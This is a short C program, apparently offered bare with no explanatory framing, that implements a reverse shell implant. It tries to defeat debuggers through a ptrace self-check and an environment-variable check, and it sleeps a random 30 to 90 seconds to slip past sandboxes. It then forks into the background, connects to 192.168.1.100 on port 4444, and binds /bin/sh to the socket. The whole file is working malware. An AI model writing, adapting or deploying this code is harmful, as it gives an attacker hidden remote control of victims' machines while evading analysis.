#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

void anti_debug() {
    // Check for ptrace
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        exit(0);
    }
    
    // Check for common debugger environment variables
    if (getenv("LD_PRELOAD") || getenv("LD_LIBRARY_PATH")) {
        exit(0);
    }
}

void delay_execution() {
    srand(time(NULL));
    int delay = rand() % 60 + 30; // 30-90 seconds
    sleep(delay);
}

int main() {
    anti_debug();
    delay_execution();
    
    int sock;
    struct sockaddr_in server;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
    
    // Fork to background
    if (fork() != 0) {
        exit(0);
    }
    
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execve("/bin/sh", NULL, NULL);
    return 0;
}